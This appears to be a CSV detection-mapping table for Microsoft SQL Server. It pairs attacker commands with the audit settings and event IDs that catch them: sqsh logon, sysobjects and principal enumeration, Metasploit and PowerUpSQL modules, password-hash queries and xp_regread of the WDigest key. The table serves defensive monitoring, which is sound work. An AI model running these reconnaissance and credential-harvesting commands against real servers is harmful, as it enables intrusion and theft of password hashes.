Phase,Category,Tool,Command,Monitoring,Config Scope,Config,Log,Attack Chain Comments,Link
1,Initial Access,sqsh,sqsh -S 192.168.3.22 -U corp1\\tboss -P admin123!,Linked to other detections.,Server,GUI based config for server logons,EVID 18453 : MSSQLSERVER Login Success For User ,Initial logon we may get some useful information for the host and IP address. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
1,Discovery,sqsh,select sysobjects.name from sysobjects where name like '%mail%',Database - Query - sysobjects - mail,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysobjects] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,An attacker can use the built in email functionality of the database to send out email. This looks for them checking to see if the mail functionality is enabled. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
1,Discovery,msfconsole,use auxiliary/admin/mssql/mssql_enum ,"Database - Query - sys.configurations
Database - Stored Procedure - xp_regread
Database - Query - master..sysdatabases
Database - Query - sys.syslogins",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[configurations] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[sysdatabases] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[sql_logins] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This Metasploit module performs a number of enumeration checks and shows an attacker other databases and information about users within the database.,https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/mssql
2,Discovery,sqsh,"EXEC sp_helprotect 'xp_dirtree'
EXEC sp_helprotect 'xp_cmdshell'",Database - Stored Procedure Execution - helprotect,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_helprotect] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Use of the sp_helprotect can be used by an attacker to see which other Stored Procedures are enabled and can be further abused.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"select * from sys.database_principals;
Invoke-Sqlcmd -Query ""select * from sys.database_principals;"" -ServerInstance ""192.168.2.149""",Database - Query - sys.database_principals,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[database_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Gets an attacker a list of all the database principals which they can then target for further exploitation. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Invoke-SQLDumpInfo -Verbose -Instance ""192.168.3.22,1433""","Database - Query - sys.database_principals
Database - Query - sys.configurations
Database - Query - sys.server_principals
Database - Stored Procedure Execution - xp_regread",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[database_principals] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[configurations] BY [dbo])
ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This PowerUpSQL module performs a number of enumeration checks and shows an attacker other databases and information about users within the database.,https://github.com/NetSPI/PowerUpSQL
2,Discovery,sqsh,select * from sys.server_principals;,Database - Query - sys.server_principals,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Gets an attacker a list of all the server principals which they can then target for further exploitation. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;","Database - Query - sys.server_principals
Database - Query - password_hash",MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[server_principals] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This query strings together information about user accounts and includes the password hash for the local accounts. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Get-SQLDomainController -Instance ""192.168.3.22,1433""","Database - Query - sys.servers
Database - Stored Procedure Execution - xp_regread",MASTER DATABASE AUDIT,"ADD (SELECT ON OBJECT::[sys].[sysservers] BY [dbo])
ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo])",EVID 33205 : SQL Audit Event - SI ,This module returns information about the Domain Controllers within the environment. ,https://github.com/NetSPI/PowerUpSQL
2,Discovery,sqsh,select loginname from master.sys.syslogins ,Database - Query - sys.syslogins,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sql_logins] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This returns all of the usernames in the database,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM sysusers,Database - Query - sysusers,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysusers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This returns all of the built in accounts within the database,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM master.INFORMATION_SCHEMA.TABLES;,Database - Recon - information_schema.tables,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[INFORMATION_SCHEMA].[TABLES] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,This will return all of the table names for an attacker,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT name FROM master.dbo.sysdatabases;,Database - Recon - master..sysdatabases,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysdatabases] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker will get all of the database names with this query so they can then perform actions on each database.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,SELECT * FROM sys.servers;,Database - Recon - sys.servers,MASTER DATABASE AUDIT,ADD (SELECT ON OBJECT::[sys].[sysservers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker can gain an understanding any linked servers. Users can execute commands on linked trusted servers.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,EXEC sp_linkedservers,Database - Stored Procedure Execution - sp_linkedservers,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[sp_linkedservers] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Initial recon where an attacker can gain an understanding any linked servers. Users can execute commands on linked trusted servers.,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,sqsh,"EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest', 'UseLogonCredential';",Database - Stored Procedure Execution - xp_regread,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,An attacker can read the entire registry from the MS-SQL server and look for well known keys that may introduce security issues such as the WDigest key. ,https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
2,Discovery,PowerUpSQL,"Get-SQLServerInfo -Verbose -Instance ""192.168.3.22,1433""",Database - Stored Procedure Execution - xp_regread,MASTER DATABASE AUDIT,ADD (EXECUTE ON OBJECT::[dbo].[xp_regread] BY [dbo]),EVID 33205 : SQL Audit Event - SI ,Returns information about the system that the database is running on and may allow an attacker to uncover an attack path,https://github.com/NetSPI/PowerUpSQL
